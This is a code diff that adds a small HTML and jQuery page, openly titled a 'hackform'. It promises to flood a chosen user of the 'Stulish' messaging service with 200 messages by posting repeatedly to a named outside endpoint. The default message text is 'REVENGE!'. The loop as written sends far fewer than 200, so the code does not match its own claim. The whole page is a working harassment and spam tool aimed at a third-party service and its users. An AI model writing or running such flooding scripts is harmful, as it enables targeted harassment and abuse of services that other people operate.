@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Stulish</title>
+</head>
+<body>
+  <h1>Hi there, if you are tired with seeing Stulish messages all over you news feed. This can help</h1>
+  <h2>This apllication will flood the Stulis user's inbox with 200 messages</h2>
+
+  <form action="http://travelangkawi.com/Home/SendMess" method="POST" id="hackform">
+    <input type="text" name="pUserName" id="username" placeholder="Enter stulish user name"> <br> <br>
+    <textarea name="pContent" id="message" placeholder="Enter your message"></textarea> <br><br>
+
+    <input type="submit" value="Submit">
+  </form> <br>
+
+  <p id="feedback"></p>
+</body>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+
+  $('#hackform').on('submit', function(e) {
+    e.preventDefault();
+    sendMessage();
+  });
+
+  var i = 0;
+  function sendMessage() {
+
+    var username = $('#username').val();
+    if (!username) {
+      alert("Please enter username");
+      return;
+    }
+    $.ajax({
+      type: 'POST',
+      dataType: 'json',
+      data: { 'pContent': $('#message').val() || 'REVENGE! huhahahahah.', 'pUserName': username },
+      url: 'http://travelangkawi.com/Home/SendMess',
+      timeout: 12000,
+      success: function (data) {
+
+      },
+      error: function (x, t, m) {
+        // i++;
+        if (i < 5) {
+          sendMessage();
+          $('#feedback').html(`Sent ${++i} times.`);
+        } else {
+          $('#feedback').html('Done');
+        };
+      }
+    });
+  }
+  // sendMessage();
+  
+</script>
+</html>
